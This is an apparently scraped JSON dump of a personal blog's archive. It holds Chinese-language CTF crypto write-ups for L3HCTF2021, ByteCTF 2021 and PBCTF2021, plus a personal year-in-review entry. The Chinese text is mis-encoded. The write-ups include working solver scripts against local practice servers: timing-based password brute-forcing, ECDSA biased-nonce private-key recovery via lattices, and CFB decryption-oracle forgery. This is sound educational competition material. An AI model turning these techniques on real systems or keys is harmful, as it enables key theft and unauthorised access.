è¿™ä¸ªassertå®Œå…¨æ²¡æœ‰ä»€ä¹ˆé¸Ÿç”¨ # assert msg.decode() == final_check.hex() self.send(b\u0026#39;Good Morning Master!\u0026#39;) self.send(flag) class ThreadedServer(socketserver.ThreadingMixIn, socketserver.TCPServer): pass class ForkedServer(socketserver.ForkingMixIn, socketserver.TCPServer): pass if __name__ == \u0026#34;__main__\u0026#34;: HOST, PORT = \u0026#39;0.0.0.0\u0026#39;, 10001 print(\u0026#34;HOST:POST \u0026#34; + HOST+\u0026#34;:\u0026#34; + str(PORT)) server = ForkedServer((HOST, PORT), Task) server.allow_reuse_address = True server.serve_forever() ä¸€ä½ä½çˆ†ç ´å¯†ç \né€šè¿‡range(0x2000)çš„é«˜è€—æ—¶æ¥åˆ¤æ–­å½“å‰æ­£åœ¨åˆ¤æ–­çš„ä½æ•°\nfrom pwn import * from time import time import string #io = remote(\u0026#34;127.0.0.1\u0026#34;, 9999) io = remote(\u0026#34;0.0.0.0\u0026#34;, 10001) CHARSET = string.printable pre = \u0026#34;\u0026#34; for _ in range(8): print(_) t = 0 now = \u0026#34;\u0026#34; for i in CHARSET[:]: io.recvuntil(b\u0026#34;:\u0026#34;) print(pre + i + \u0026#34;0\u0026#34;) io.sendline((pre + i + \u0026#34;0\u0026#34;).encode()) start = time() # ç­‰å¾… \u0026#34;False!\u0026#34; io.recvuntil(b\u0026#34;!\u0026#34;) end = time() # å‡ºç°é”™è¯¯çš„æ—¶é—´å¤§äºä¸Šä¸€æ¬¡å‡ºç°é”™è¯¯çš„æ—¶é—´ # è¯æ˜å½“å‰å­—ç¬¦æ‰å¯¹äº†ï¼Œæ­£ç¡®çš„åºåˆ—åˆå˜é•¿äº†ä¸€ä½ if (end - start) \u0026gt; t: now = i t = end - start print(end - start) print() print(t) #exit() pre = pre + now print(pre) io.interactive() æœ€åæ‹¿åˆ°passwdäº†ncä¸Šå»è¾“å…¥æ‹¿åˆ°flag\n","date":"14 November 2021","permalink":"/achieve/%E5%A4%8D%E7%9B%982/","section":"archive","summary":"","title":"é—²é¢˜æ‚è®°2"},{"content":" é˜¿å·´é˜¿å·´ï¼Œå‘¨æœ«ç™½å¤©å¿™äº†ä¸€æ•´å¤©å­¦æ ¡çš„äº‹ï¼Œæ™šä¸ŠæŒ‚æœºè·‘äº†ä¸€æ™šè¿˜æ˜¯æ²¡è·‘å‡ºæ¥æ\nEzECDSA # This challenge use SECP256k1 curve to generate the generator ec system\nwe get 100 sets of signatures and the task.py tells us the low-8bits of K\nleakï¼š$kp = K;mod;256$\nand question-44644 on stackexchange says its a problem of Elliptic Curve Digital Signature Algorithm with Partially Known Nonces\nIn thereï¼Œknown nonce is low-8bits\nThe idea is to convert the determination of a private key from biased k nonces in several ECDSA signatures into instances of the hidden number problem (HNP), and then solve the HNP as a reduction to the closest vector problem(CVP).\nAt least ,we kwon we can turn sequence S into a Linear structure\nand the answer also tells us,how to turn the equation in a HNP\nyou can write k as\n$k = a + 2^\\ell b$\nthen\nperfect,without any problem\nDefine\nand you have\n$xt = u + b$\nconstruct sequence\nThen,construct a matrix out of basis vectors:\nwhich from this article\nso,we should to find a beautiful B ,Then make\n$S_T=B/p$\n$S_U=B$\nand if you are palying with a good luck\nmost likely, you\u0026rsquo;ll see the next-to-last entry of next-to-last row containing a dA or -dA\nunfortunatelyï¼Œthe lattice in paper seems not very efficient\nand @BitLogiK gives a efficient way to make the boundary valid\nHis way of constructing denotation:\n$T_i=2\\cdot2^{\\ell}\\cdot \\frac{R_i}{2^{\\ell}\\cdot S_i} ;mod;n$\n$U_i=(2\\cdot 2^{\\ell}\\cdot \\frac{KP_i-H_i}{2^{\\ell}\\cdot S_i} ;mod;n)+n$\n$Q\u0026rsquo;=2\\cdot 2^{\\ell}\\cdot n$\n$C_t=1$\n$C_u=q$\nnew lattice looks like this:\nthen,the privacy will lay in next-to-last col\nObviously,I\ndef test_result(mat, target_pubkey, curve): mod_n = ecdsa_lib.curve_n(curve) for row in mat: candidate = row[-2] % mod_n if candidate \u0026gt; 0: cand1 = candidate cand2 = mod_n - candidate if target_pubkey == ecdsa_lib.privkey_to_pubkey(cand1, curve): return cand1 if target_pubkey == ecdsa_lib.privkey_to_pubkey(cand2, curve): return cand2 return 0 solve # recv data into a jsonfile and set lattice_attack.py options and get flag by hand\nor copy others code to have a happy day ğŸ˜€\n#! python3 import icecream import string from icecream import * from pwnlib.util.iters import mbruteforce from pwn import * from hashlib import sha256 from tqdm import tqdm from rich.progress import track from rich.traceback import install install() # ----------------------------------- table = string.ascii_letters+string.digits from Crypto.Util.number import * io = remote(\u0026#39;0.0.0.0\u0026#39;,23331) def gopow(): s=io.recvuntil(\u0026#34;XXXX+\u0026#34;.encode(\u0026#34;utf-8\u0026#34;)) s=io.recvuntil(\u0026#34;)\u0026#34;.encode(\u0026#34;utf-8\u0026#34;)) suffix=s[:-1] s=io.recvuntil(\u0026#34;==\u0026#34;.encode(\u0026#34;utf-8\u0026#34;)) s=io.recvuntil(\u0026#34;\\n\u0026#34;.encode(\u0026#34;utf-8\u0026#34;)) cipher=s[1:-1].decode() ic(cipher) ic(suffix) # ic(\u0026#34;AAAA\u0026#34;.encode() + suffix) # ic(sha256(\u0026#34;AAAA\u0026#34;.encode() + suffix).hexdigest()) proof = mbruteforce(lambda x: sha256(x.encode() + suffix).hexdigest() == cipher, table, length=4, method=\u0026#39;fixed\u0026#39;) ic(proof) io.sendlineafter(\u0026#34;Give me XXXX:\u0026#34;, proof) gopow() pubkey=eval(io.recvline()) data={} from tqdm import tqdm from os import system data[\u0026#34;curve\u0026#34;]=\u0026#34;SECP256K1\u0026#34; data[\u0026#34;public_key\u0026#34;]=[pubkey[0],pubkey[1]] #data[\u0026#34;message\u0026#34;]=\u0026#34;0\u0026#34;.encode(\u0026#34;utf-8\u0026#34;) data[\u0026#34;known_type\u0026#34;]=\u0026#34;LSB\u0026#34; data[\u0026#34;known_bits\u0026#34;]=8 data[\u0026#34;signatures\u0026#34;]=[] for i in tqdm(range(100)): io.recvuntil(\u0026#34;ge:\u0026#34;.encode(\u0026#34;utf-8\u0026#34;)) io.sendline(\u0026#34;0\u0026#34;.encode(\u0026#34;utf-8\u0026#34;)) io.recvuntil(\u0026#34;r =\u0026#34;.encode(\u0026#34;utf-8\u0026#34;)) ( ()) r=int(io.recvline()) io.recvuntil(\u0026#34;s =\u0026#34;.encode(\u0026#34;utf-8\u0026#34;)) s=int(io.recvline()) io.recvuntil(\u0026#34;kp =\u0026#34;.encode(\u0026#34;utf-8\u0026#34;)) kp=int(io.recvline()) io.recvuntil(\u0026#34;hash =\u0026#34;.encode(\u0026#34;utf-8\u0026#34;)) hsh=int(io.recvline()) (data[\u0026#34;signatures\u0026#34;]).append({\u0026#34;r\u0026#34;:r,\u0026#34;s\u0026#34;:s,\u0026#34;kp\u0026#34;:kp,\u0026#34;hash\u0026#34;:hsh}) f=open(\u0026#34;data.json\u0026#34;,\u0026#34;w\u0026#34;) import json f.write(json.dumps(data)) f.close() system(\u0026#34;python3 lattice_attack.py -f data.json\u0026#34;) d=eval(input(\u0026#34;plz input the ans\\n\u0026#34;)) io.sendline(str(d).encode(\u0026#34;utf-8\u0026#34;)) io.interactive() The curse of ECDSA nonces # In the question-44644 on stackexchange we know how to solve HNP of bias nonce ecdsa\nAnd Minerva: The curse of ECDSA nonces shows us the attack in detail\nObviouslyï¼Œthe primitives is not what we should focus on\nremove U to raise speedï¼Ÿ\nSo mul $2^\\ell$to T and U to\nadd a N to U\nSoï¼Œwe make make an effort to make the boundary valid? :D\n","date":"14 November 2021","permalink":"/achieve/ctf/l3hctf2021/","section":"archive","summary":"","title":"L3HCTF2021"},{"content":" ç¬‘æ­»,xybä¿¡å·å±è”½æ‹‰æ»¡,è“ç‰™éƒ½ä¸è®©ç”¨,åªèƒ½æ¥è‹Ÿå”¯ä¸€ä¸€ä¸ªä¸å‡ºç½‘çš„é¢˜\næ€»å¾—æ¥è¯´æ°´å¹³è¿˜æ˜¯æ¯”è¾ƒç»ç»å­ï¼Œå»¶ç»­äº†å­—èŠ‚å»å¹´ç‚¼ä¸¹é¢˜çš„çš„ä¼˜è‰¯ä¼ ç»Ÿï¼Œ\nEASYXOR # ä¸»è¦éš¾åº¦åœ¨é€†convertå’ŒçŒœByteCTF{å‰ç¼€å¤§å°å†™ä¸ŠğŸ¤­\nconvert\ndef shift(m, k, c): if k \u0026lt; 0: return m ^ (m \u0026gt;\u0026gt; (-k)) \u0026amp; c return m ^ ((m \u0026lt;\u0026lt; k) \u0026amp; c) å¤§æ¦‚æ˜¯å› ä¸ºæœ‰ä¸ªä½ç§»å¯¼è‡´éƒ¨åˆ†æ•°æ®æ³„éœ²ï¼Œåˆ†æ¸…å·¦å³é¡ºåºå’Œå‰åä¸€ç‚¹ç‚¹æ…¢æ…¢æŠŠmæ¢å¤å‡ºæ¥\nå¤§è‡´æµç¨‹å¦‚ä¸‹ï¼š\ninv convertï¼š\ndef invshift_opt(c,k,mask): c = bin(c)[2:].rjust(64,\u0026#39;0\u0026#39;) cip=[int(i) for i in c] mask = bin(mask)[2:].rjust(64,\u0026#39;0\u0026#39;) mask=[int(i) for i in mask] ans={} idx = 63 for i in range(k): ans[idx]=cip.pop() idx-=1 for i in range(63-k,-1,-1): tmp = cip[i]^(ans[i+k]\u0026amp;mask[i]) ans[i]=tmp flag =\u0026#39;\u0026#39; for i in range(64): flag += str(ans[i]) ans = int(flag,2) return ans def invshift_ngt(c,k,mask): k=-k c = bin(c)[2:].rjust(64,\u0026#39;0\u0026#39;) cip=[int(i) for i in c] mask = bin(mask)[2:].rjust(64,\u0026#39;0\u0026#39;) mask=[int(i) for i in mask] ans={} for i in range(k): ans[i]=cip[i] for i in range(k,64): tmp = cip[i]^(ans[i-k]\u0026amp;mask[i]) ans[i]=tmp flag =\u0026#39;\u0026#39; for i in range(64): flag += str(ans[i]) # ans=[str(ans[i]) for i in range(64)] # ans = \u0026#34;\u0026#34;.join(ans) ans = int(flag,2) return ans def invconvert(m, key): c_list = [0x37386180af9ae39e, 0xaf754e29895ee11a, 0x85e1a429a2b7030c, 0x964c5a89f6d3ae8c] for t in range(3,-1,-1): if(key[t]\u0026gt;0): m = invshift_opt(m, key[t], c_list[t]) else: m = invshift_ngt(m, key[t], c_list[t]) return m ç„¶åæ‰“è¡¨çˆ†ç ´keysï¼ŒæŠŠapiå…¨éƒ¨æ‹–å‡ºæ¥ç”¨pypyå‡ åˆ†é’Ÿå°±è·‘å®Œäº†\nâ¯â¯ easyxor 10:22 pypy3 .\\solve.py 5228891it [02:22, 34737.70it/s]b\u0026#39;15654747\u0026#39; b\u0026#39;5u2t}$$$\u0026#39; [-12, 26, -3, -31] ç„¶åæœ¬é¢˜æœ€éš¾çš„åœ°æ–¹æ¥äº†ï¼ŒğŸ‘´æ€ç´¢äº†2ä¸ªå°æ—¶æ„£æ˜¯æ²¡æœ‰è€ƒè™‘å‰ç¼€çš„æƒ…å†µ\næ‹¿ç€flag{xxxçˆ†äº†åŠå¤©\nç„¶åæ‰æƒ³èµ·æ¥å­¦å¼Ÿä»¬æ‰“çš„æ˜¯å­—èŠ‚CTF\nç„¶åç¥¥äº‘è¢«åœºåœ°æ²¡ç½‘ï¼Œå·¥ä½œäººå‘˜ä¸çŸ¥é“æŠŠğŸ‘´çš„æ‰‹æœºæ”¾å“ªé‡Œäº†ï¼Œçƒ­ç‚¹éƒ½æ‰¾ä¸åˆ°ï¼Œåªèƒ½çŒœå‰ç¼€äº†\nå¥½åœ¨ä»—ç€ğŸ‘´ä¸å¤ªä¼˜ç§€çš„å˜é‡å‘½ååŠŸåº•ç»™å‰ç¼€ByteCTF{çŒœå‡ºæ¥äº†\nsolve # from tqdm import tqdm # ----------------------------------- from itertools import * from expApi import * # pypy3çˆ†ç ´ç§˜é’¥ ofb = \u0026#34;89b8aca257ee2748f030e7f6599cbe0cbb5db25db6d3990d\u0026#34; cbc = \u0026#34;3b752eda9689e30fa2b03ee748e0da3c989da2bba657b912\u0026#34; tab = [-32,-31, -30, -29, -28, -27, -26, -25, -24, -23, -22, -21, -20, -19, -18, -17, -16, -15, -14, -13, -12, -11, -10, -9, -8, -7, -6, -5, -4, -3, -2, -1, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31,32] c = [int(cbc[i:i+16],16) for i in range(0,48,16)] c2=c[1] c3=c[2] c1=c[0] for k in tqdm(product(tab,repeat=4)): keys = list(k) # keys = [16 for _ in range(4)] # IV = 10708643912928985573 tmp = invconvert(c3,keys) g3 = long_to_bytes(tmp^c2) if(check(g3)==True): tmp = invconvert(c2,keys) g2 = long_to_bytes(tmp^c1) # print(g2) # print(g3) # print(keys) if(check(g2)==True): print(g2) print(g3) print(keys) # keys = [-12, 26, -3, -31] def getiv(keys,ofb): c = [int(ofb[i:i+16],16) for i in range(0,48,16)] m21 =bytes_to_long( b\u0026#39;ByteCTF{\u0026#39;) IV = invconvert(m21^c[0],keys) return IV keys = [-12, 26, -3, -31] ofb = \u0026#34;89b8aca257ee2748f030e7f6599cbe0cbb5db25db6d3990d\u0026#34; cbc = \u0026#34;3b752eda9689e30fa2b03ee748e0da3c989da2bba657b912\u0026#34; IV = getiv(keys,ofb) # CBC iv = IV groups = [] c = [int(cbc[i:i+16],16) for i in range(0,48,16)] c3 = c[2] c2 = c[1] for i in range(3): tmp = invconvert(c[i],keys) groups.append(tmp^iv) iv = c[i] flag2 = b\u0026#39;\u0026#39;.join( [long_to_bytes(i) for i in groups]) # OFB iv = IV groups = [] c = [int(ofb[i:i+16],16) for i in range(0,48,16)] for i in range(3): tmp = convert(iv,keys) g = c[i]^tmp groups.append(g) iv = tmp flag1 = b\u0026#39;\u0026#39;.join( [long_to_bytes(i) for i in groups]) print(flag1+flag2) # ByteCTF{5831a241s-f30980q535af-2156547475u2t}$$$ expApi # import struct import sys def bytes_to_long(s): \u0026#34;\u0026#34;\u0026#34;Convert a byte string to a long integer (big endian). In Python 3.2+, use the native method instead:: \u0026gt;\u0026gt;\u0026gt; int.from_bytes(s, \u0026#39;big\u0026#39;) For instance:: \u0026gt;\u0026gt;\u0026gt; int.from_bytes(b\u0026#39;\\x00P\u0026#39;, \u0026#39;big\u0026#39;) 80 This is (essentially) the inverse of :func:`long_to_bytes`. \u0026#34;\u0026#34;\u0026#34; acc = 0 unpack = struct.unpack # Up to Python 2.7.4, struct.unpack can\u0026#39;t work with bytearrays nor # memoryviews if sys.version_info[0:3] \u0026lt; (2, 7, 4): if isinstance(s, bytearray): s = bytes(s) elif isinstance(s, memoryview): s = s.tobytes() length = len(s) if length % 4: extra = (4 - length % 4) s = b\u0026#39;\\x00\u0026#39; * extra + s length = length + extra for i in range(0, length, 4): acc = (acc \u0026lt;\u0026lt; 32) + unpack(\u0026#39;\u0026gt;I\u0026#39;, s[i:i+4])[0] return acc def long_to_bytes(n, blocksize=0): \u0026#34;\u0026#34;\u0026#34;Convert an integer to a byte string. In Python 3.2+, use the native method instead:: \u0026gt;\u0026gt;\u0026gt; n.to_bytes(blocksize, \u0026#39;big\u0026#39;) For instance:: \u0026gt;\u0026gt;\u0026gt; n = 80 \u0026gt;\u0026gt;\u0026gt; n.to_bytes(2, \u0026#39;big\u0026#39;) b\u0026#39;\\x00P\u0026#39; If the optional :data:`blocksize` is provided and greater than zero, the byte string is padded with binary zeros (on the front) so that the total length of the output is a multiple of blocksize. If :data:`blocksize` is zero or not provided, the byte string will be of minimal length. \u0026#34;\u0026#34;\u0026#34; # after much testing, this algorithm was deemed to be the fastest s = b\u0026#39;\u0026#39; n = int(n) pack = struct.pack while n \u0026gt; 0: s = pack(\u0026#39;\u0026gt;I\u0026#39;, n \u0026amp; 0xffffffff) + s n = n \u0026gt;\u0026gt; 32 # strip off leading zeros for i in range(len(s)): if s[i] != b\u0026#39;\\x00\u0026#39;[0]: break else: # only happens when n == 0 s = b\u0026#39;\\x00\u0026#39; i = 0 s = s[i:] # add back some pad bytes. this could be done more efficiently w.r.t. the # de-padding being done above, but sigh... if blocksize \u0026gt; 0 and len(s) % blocksize: s = (blocksize - len(s) % blocksize) * b\u0026#39;\\x00\u0026#39; + s return s def check(s): for i in s: if(i\u0026gt;32 and i\u0026lt;127): continue else: return False return True def shift(m, k, c): if k \u0026lt; 0: return m ^ (m \u0026gt;\u0026gt; (-k)) \u0026amp; c return m ^ ((m \u0026lt;\u0026lt; k) \u0026amp; c) def convert(m, key): c_list = [0x37386180af9ae39e, 0xaf754e29895ee11a, 0x85e1a429a2b7030c, 0x964c5a89f6d3ae8c] for t in range(4): m = shift(m, key[t], c_list[t]) return m def invshift_opt(c,k,mask): c = bin(c)[2:].rjust(64,\u0026#39;0\u0026#39;) cip=[int(i) for i in c] mask = bin(mask)[2:].rjust(64,\u0026#39;0\u0026#39;) mask=[int(i) for i in mask] ans={} idx = 63 for i in range(k): ans[idx]=cip.pop() idx-=1 for i in range(63-k,-1,-1): tmp = cip[i]^(ans[i+k]\u0026amp;mask[i]) ans[i]=tmp flag =\u0026#39;\u0026#39; for i in range(64): flag += str(ans[i]) ans = int(flag,2) return ans def invshift_ngt(c,k,mask): k=-k c = bin(c)[2:].rjust(64,\u0026#39;0\u0026#39;) cip=[int(i) for i in c] mask = bin(mask)[2:].rjust(64,\u0026#39;0\u0026#39;) mask=[int(i) for i in mask] ans={} for i in range(k): ans[i]=cip[i] for i in range(k,64): tmp = cip[i]^(ans[i-k]\u0026amp;mask[i]) ans[i]=tmp flag =\u0026#39;\u0026#39; for i in range(64): flag += str(ans[i]) ans = int(flag,2) return ans def invconvert(m, key): c_list = [0x37386180af9ae39e, 0xaf754e29895ee11a, 0x85e1a429a2b7030c, 0x964c5a89f6d3ae8c] for t in range(3,-1,-1): if(key[t]\u0026gt;0): m = invshift_opt(m, key[t], c_list[t]) else: m = invshift_ngt(m, key[t], c_list[t]) return m document for JustDecrypt # è¿˜æ˜¯æ¯”è¾ƒæœ‰æ„æ€çš„ç‚¼ä¸¹é¢˜ï¼Œæœ‰ç‚¹CBCæ‰“oracleçš„æ„Ÿè§‰ï¼Œæ€»å¾—æ¥è¯´è¿˜æ˜¯æ¯”è¾ƒæœ‰æ„æ€\ntask\n#!/usr/bin/env python3.9 # -*- coding: utf-8 -*- import string import random import socketserver import signal import codecs from os import urandom from hashlib import sha256 from Crypto.Cipher import AES from flag import FLAG BANNER = rb\u0026#34;\u0026#34;\u0026#34; ___ _ ______ _ |_ | | | | _ \\ | | | |_ _ ___| |_ | | | |___ ___ _ __ _ _ _ __ | |_ | | | | / __| __| | | | / _ \\/ __| \u0026#39;__| | | | \u0026#39;_ \\| __| /\\__/ / |_| \\__ \\ |_ | |/ / __/ (__| | | |_| | |_) | |_ \\____/ \\__,_|___/\\__| |___/ \\___|\\___|_| \\__, | .__/ \\__| __/ | | |___/|_| \u0026#34;\u0026#34;\u0026#34; BLOCK_SIZE = 16 class AES_CFB(object): def __init__(self): self.key = urandom(BLOCK_SIZE) self.iv = urandom(16) self.aes_encrypt = AES.new(self.key, AES.MODE_CFB, self.iv) self.aes_decrypt = AES.new(self.key, AES.MODE_CFB, self.iv) def encrypt(self, plain): return self.aes_encrypt.encrypt(self.pad(plain)) def decrypt(self, cipher): return self.unpad(self.aes_decrypt.decrypt(cipher)) @staticmethod def pad(s): num = BLOCK_SIZE - (len(s) % BLOCK_SIZE) return s + bytes([num] * num) @staticmethod def unpad(s): return s[:-s[-1]] class Task(socketserver.BaseRequestHandler): def _recvall(self): BUFF_SIZE = 1024 data = b\u0026#39;\u0026#39; while True: part = self.request.recv(BUFF_SIZE) data += part if len(part) \u0026lt; BUFF_SIZE: break return data.strip() def send(self, msg, newline=True): try: if newline: msg += b\u0026#39;\\n\u0026#39; self.request.sendall(msg) except: pass def recv(self, prompt=b\u0026#39;\u0026gt; \u0026#39;): self.send(prompt, newline=False) return self._recvall() def proof_of_work(self): random.seed(urandom(32)) alphabet = string.ascii_letters + string.digits proof = \u0026#39;\u0026#39;.join(random.choices(alphabet, k=32)) hash_value = sha256(proof.encode()).hexdigest() self.send(f\u0026#39;sha256(XXXX+{proof[4:]}) == {hash_value}\u0026#39;.encode()) nonce = self.recv(prompt=b\u0026#39;Give me XXXX \u0026gt; \u0026#39;) if len(nonce) != 4 or sha256(nonce + proof[4:].encode()).hexdigest() != hash_value: return False return True def timeout_handler(self, signum, frame): raise TimeoutError def handle(self): try: signal.signal(signal.SIGALRM, self.timeout_handler) signal.alarm(60) self.send(BANNER) # if not self.proof_of_work(): # self.send(b\u0026#39;\\nWrong!\u0026#39;) # self.request.close() # return self.send(b\u0026#34;It\u0026#39;s just a decryption system. And I heard that only the Bytedancer can get secret.\u0026#34;) aes = AES_CFB() # signal.alarm(300) for i in range(52): cipher_hex = self.recv(prompt=b\u0026#39;Please enter your cipher in hex \u0026gt; \u0026#39;) if len(cipher_hex) \u0026gt; 2048: self.send(b\u0026#34;It\u0026#39;s too long!\u0026#34;) continue try: cipher = codecs.decode(cipher_hex, \u0026#39;hex\u0026#39;) except: self.send(b\u0026#39;Not hex data!\u0026#39;) continue if len(cipher) == 0 or len(cipher) % BLOCK_SIZE != 0: self.send(f\u0026#39;Cipher length must be a multiple of {BLOCK_SIZE}!\u0026#39;.encode()) continue plaintext = aes.decrypt(cipher) plaintext_hex = codecs.encode(plaintext, \u0026#39;hex\u0026#39;) self.send(b\u0026#39;Your plaintext in hex: \\n%s\\n\u0026#39; % plaintext_hex) if plaintext == b\u0026#34;Hello, I\u0026#39;m a Bytedancer. Please give me the flag!\u0026#34;: self.send(b\u0026#39;OK! Here is your flag: \u0026#39;) self.send(FLAG.encode()) break self.send(b\u0026#39;Bye!\\n\u0026#39;) except TimeoutError: self.send(b\u0026#39;\\nTimeout!\u0026#39;) except Exception as err: self.send(b\u0026#39;Something Wrong!\u0026#39;) finally: self.request.close() class ForkedServer(socketserver.ForkingMixIn, socketserver.TCPServer): pass if __name__ == \u0026#34;__main__\u0026#34;: HOST, PORT = \u0026#39;0.0.0.0\u0026#39;, 30002 print(HOST, PORT) server = ForkedServer((HOST, PORT), Task) server.allow_reuse_address = True server.serve_forever() å¤§æŠµæ˜¯ä¸€ä¸‹å‡ ä¸ªçŸ¥è¯†ç‚¹ï¼š\nCFBæ¨¡å¼æœºåˆ¶ å¦‚ä½•padding oracle è¾“å…¥ä¸€ä¸ªæ¶ˆæ¯å—æ¥è®¾ç½®å®šé•¿iv\nè¾“å…¥\\x00å‚æ•°æ¥è·å–æµç§˜é’¥è·‘64æ¬¡å¯ä»¥å®Œå…¨oracle\nè·‘ä¸æ»¡64æ¬¡ä¹Ÿå¯ä»¥å¯¹ä½ä½å—¯çŒœ\nfrom Crypto.Util.number import * from pwn import * from tqdm import tqdm def main(): r = remote(\u0026#39;0.0.0.0\u0026#39;, \u0026#39;30002\u0026#39;) plaintext = b\u0026#34;Hello, I\u0026#39;m a Bytedancer. Please give me the flag!\u0026#34;+b\u0026#34;\\x0f\u0026#34;*15 def my_XOR(a, b): assert len(a) == len(b) return b\u0026#39;\u0026#39;.join([long_to_bytes(a[i]^b[i]) for i in range(len(a))]) def proof_of_work(): rev = r.recvuntil(b\u0026#34;sha256(XXXX+\u0026#34;) suffix = r.recv(28).decode() rev = r.recvuntil(b\u0026#34; == \u0026#34;) tar = r.recv(64).decode() def f(x): hashresult = hashlib.sha256(x.encode()+suffix.encode()).hexdigest() return hashresult == tar prefix = util.iters.mbruteforce(f, string.digits + string.ascii_letters, 4, \u0026#39;upto\u0026#39;) r.recvuntil(b\u0026#39;Give me XXXX \u0026gt; \u0026#39;) r.sendline(prefix.encode()) def decrypt(msg): newmsg = msg + b\u0026#39;\\x00\u0026#39;*(256+64-len(msg)) r.recvuntil(b\u0026#39;Please enter your cipher in hex \u0026gt; \u0026#39;) r.sendline(newmsg.hex().encode()) r.recvline() result = r.recvline().decode().strip() return bytes.fromhex(result) def decrypt_(msg): newmsg = msg + b\u0026#39;\\x00\u0026#39;*(256-len(msg)) r.recvuntil(b\u0026#39;Please enter your cipher in hex \u0026gt; \u0026#39;) r.sendline(newmsg.hex().encode()) r.recvline() result = r.recvline().decode().strip() return bytes.fromhex(result) # proof_of_work() msg = b\u0026#39;\\x00\u0026#39;*16 decrypt(msg) c = b\u0026#34;\u0026#34; for i in range(50): t = decrypt(c)[i] c += long_to_bytes(t^plaintext[i]) decc = decrypt_(c) print(decc) res = r.recvline()+r.recvline() if b\u0026#34;Here is your flag\u0026#34; in res: print(r.recvline()) print(r.recvline()) r.close() return (True, len(decc)) r.close() return (False, len(decc)) ll = [] while True: ss = main() ll.append(ss[1]) if ss[0]: break print(len(ll), ll) ","date":"20 October 2021","permalink":"/achieve/ctf/bytectf2021/","section":"archive","summary":"","title":"writeUP for ByteCTF 2021"},{"content":"ä¸€æ™ƒçœ¼2021å°±å¿«è¿‡å»ä¸€å¤§åŠäº†,æœ¬æ¥å‡†å¤‡æ”¾å‡å†™çš„\nä¸€æ™ƒçœ¼2021å°±å¿«è¿‡å»äº†\nå¹²è„†å¿™é‡Œå·é—²æä¸€ç‚¹å§\nè™½ç„¶è·‘åˆ°å¤–é¢å»ä¹Ÿä¸çŸ¥é“ç©ä»€ä¹ˆ,æ™¯ç‚¹ä¹Ÿæ‡’å¾—å»,å¿™ç€èµ¶è·¯å’Œåšå†³å®šä¸çŸ¥ä¸è§‰æµªè´¹äº†ä¸€å †æ—¶é—´\nä½†è¿˜æ˜¯æƒ³è·‘å‡ºå»ç©\nä¸€å¹´å°±è¿™æ ·æµ‘æµ‘å™©å™©åœ°è¿‡å»äº†ï¼Œå¾—åˆ°ä»€ä¹ˆå¤±å»ä»€ä¹ˆä¹Ÿä¸å¥½è¯´\næ€»ä¹‹é€ç€è¿˜æœ‰å¹²åŠ²ï¼Œå¤šæé«˜å•ä½æ—¶é—´åˆ©ç”¨ç‡å§ğŸ˜©\nä¸ŠåŠå¹´ # æè€æ¿è¯·åƒé¥­ å¯å–œå¯è´ºå¯å–œå¯è´º\né•¿æ±Ÿå¸¦æ¡¥\nä¸‹åŠå¹´ # å•Šå‚»é€¼äº†åˆ·æœºæŠŠæ•°æ®å¤‡ä»½ææ²¡äº†ï¼Œæˆ‘çš„æš‘å‡ä»€ä¹ˆéƒ½æ²¡ç•™ä¸‹\nç½šå å¥½ï¼\näº‹æ–°å¹³æ¿å“¦\nå¤æ—¥é™å®šï¼ˆæœç„¶åªæœ‰å’Œæœ‹å‹ä¸€èµ·çƒ¤è‚‰æ‰èƒ½æ“åˆ°äººå‡150ã€‚ã€‚ã€‚ï¼‰\nä¸€å¹´åŠæ²¡å›å»çœ‹äº†\nè®©äººæ‰san\u0026hellip;.æ¬²ç½¢ä¸èƒ½\u0026hellip;.å°±æ˜¯è¯´\nå˜¿å˜¿å˜¿ğŸ¤¤ğŸ¤¤ğŸ¤¤å°çŒ«å’ªğŸ¤¤ğŸ¤¤ğŸ¤¤\næºœäº†æºœäº†\nå·èˆªçš„ç©ºå§å°å§å§å¾ˆæ¼‚äº®ğŸ˜²ğŸ˜²ğŸ˜²å·´èœ€åˆ©äºšèµ›é«˜\nåƒ\nstroll\nåä¸Šå…„å¼Ÿçš„è½¦äº†XXXXD\nä»€ä¹ˆæ—¶å€™å»è€ƒä¸ªé©¾ç…§å§XXD\n","date":"20 October 2021","permalink":"/achieve/loving-2021/","section":"archive","summary":"","title":"loving-2021"},{"content":"\rPBCTF2021 # A CTF event with highly speaking by perfect-blue team.\nAlkaloid Stream # #!/usr/bin/env python3 import random from flag import flag def keygen(ln): # Generate a linearly independent key arr = [ 1 \u0026lt;\u0026lt; i for i in range(ln) ] for i in range(ln): for j in range(i): if random.getrandbits(1): arr[j] ^= arr[i] for i in range(ln): for j in range(i): if random.getrandbits(1): arr[ln - 1 - j] ^= arr[ln - 1 - i] return arr def gen_keystream(key): ln = len(key) # Generate some fake values based on the given key... fake = [0] * ln for i in range(ln): for j in range(ln // 3): if i + j + 1 \u0026gt;= ln: break fake[i] ^= key[i + j + 1] # Generate the keystream res = [] for i in range(ln): t = random.getrandbits(1) if t: res.append((t, [fake[i], key[i]])) else: res.append((t, [key[i], fake[i]])) # Shuffle! random.shuffle(res) keystream = [v[0] for v in res] public = [v[1] for v in res] return keystream, public def xor(a, b): return [x ^ y for x, y in zip(a, b)] def recover_keystream(key, public): st = set(key) keystream = [] for v0, v1 in public: if v0 in st: keystream.append(0) elif v1 in st: keystream.append(1) else: assert False, \u0026#34;Failed to recover the keystream\u0026#34; return keystream def bytes_to_bits(inp): res = [] for v in inp: res.extend(list(map(int, format(v, \u0026#39;08b\u0026#39;)))) return res def bits_to_bytes(inp): res = [] for i in range(0, len(inp), 8): res.append(int(\u0026#39;\u0026#39;.join(map(str, inp[i:i+8])), 2)) return bytes(res) flag = bytes_to_bits(flag) key = keygen(len(flag)) keystream, public = gen_keystream(key) assert keystream == recover_keystream(key, public) enc = bits_to_bytes(xor(flag, keystream)) print(enc.hex()) print(public) simple algebraic problem\nfake has always a 0 element,we can recover the key and flag-stream step by step.\nsolve by my teammates\nfrom Crypto.Util.number import * from data import * keys = [] tmp = pub.copy() for key in tmp: if key[0] == 0: keys.append(key[1]) tmp.remove(key) print(\u0026#39;last key:\u0026#39; + str(key[1])) elif key[1] == 0: keys.append(key[0]) tmp.remove(key) print(\u0026#39;last key:\u0026#39; + str(key[0])) fake = keys[0] for _ in range(len(pub) - 1): for key in tmp: if key[0] == fake: keys.insert(0, key[1]) tmp.remove(key) fake = 0 elif key[1] == fake: keys.insert(0, key[0]) tmp.remove(key) fake = 0 if len(keys) \u0026lt;= len(pub) // 